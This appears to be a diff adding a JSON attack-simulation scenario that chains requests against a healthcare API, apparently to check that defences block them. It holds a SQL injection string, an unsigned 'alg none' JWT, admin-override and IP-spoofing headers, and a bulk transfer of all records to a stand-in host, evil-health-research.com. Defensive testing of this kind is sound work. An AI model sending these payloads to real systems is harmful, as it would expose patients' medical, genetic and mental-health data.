@@ -1,0 +1,204 @@
+{
+  "id": "api-demo-healthcare-breach",
+  "name": "Healthcare PHI Data Breach Campaign",
+  "category": "Industry Attacks",
+  "difficulty": "Advanced",
+  "description": "Sophisticated healthcare data breach targeting PHI records, genetic profiles, and mental health data following MITRE ATT&CK healthcare sector patterns",
+  "steps": [
+    {
+      "id": "recon-hipaa-directory",
+      "name": "HIPAA Directory Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/hipaa/directory"
+      },
+      "execution": {
+        "delayMs": 2000
+      }
+    },
+    {
+      "id": "recon-phi-endpoints",
+      "name": "PHI Endpoint Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/medical/phi/endpoints"
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "dependsOn": [
+        "recon-hipaa-directory"
+      ]
+    },
+    {
+      "id": "search-patient-sqli",
+      "name": "Patient Record Search SQLi",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/healthcare/records/search?name=John' OR '1'='1&ssn=*"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "recon-phi-endpoints"
+      ]
+    },
+    {
+      "id": "enumerate-records",
+      "name": "Medical Record IDOR Enumeration",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/healthcare/records/MRN-000001",
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoibnVyc2UifQ."
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "search-patient-sqli"
+      ]
+    },
+    {
+      "id": "genetic-profile-access",
+      "name": "Access Genetic Profiles Database",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/medical/genetics/profiles",
+        "headers": {
+          "X-Admin-Override": "true",
+          "X-Forwarded-For": "10.0.0.1"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "enumerate-records"
+      ]
+    },
+    {
+      "id": "mental-health-breach",
+      "name": "Mental Health Session Data Access",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/medical/mental-health/sessions",
+        "headers": {
+          "Authorization": "Bearer stolen_therapist_token"
+        }
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "genetic-profile-access"
+      ]
+    },
+    {
+      "id": "prescription-history",
+      "name": "Prescription History Harvesting",
+      "stage": "collection",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/healthcare/prescriptions/history?limit=10000"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "dependsOn": [
+        "mental-health-breach"
+      ]
+    },
+    {
+      "id": "insurance-policy-dump",
+      "name": "Insurance Policy Information Dump",
+      "stage": "collection",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/insurance/policies",
+        "headers": {
+          "X-Include-SSN": "true",
+          "X-Include-Financial": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "prescription-history"
+      ]
+    },
+    {
+      "id": "bulk-phi-export",
+      "name": "Bulk PHI Data Exfiltration",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/hipaa/export/bulk?format=json&include_all=true",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+        }
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "insurance-policy-dump"
+      ]
+    },
+    {
+      "id": "encrypted-transfer",
+      "name": "Encrypted PHI Transfer Attempt",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/hipaa/transfer/encrypted",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "destination": "https://evil-health-research.com/collect",
+          "records": [
+            "*"
+          ],
+          "encryption": "AES256"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "bulk-phi-export"
+      ]
+    }
+  ]
+}
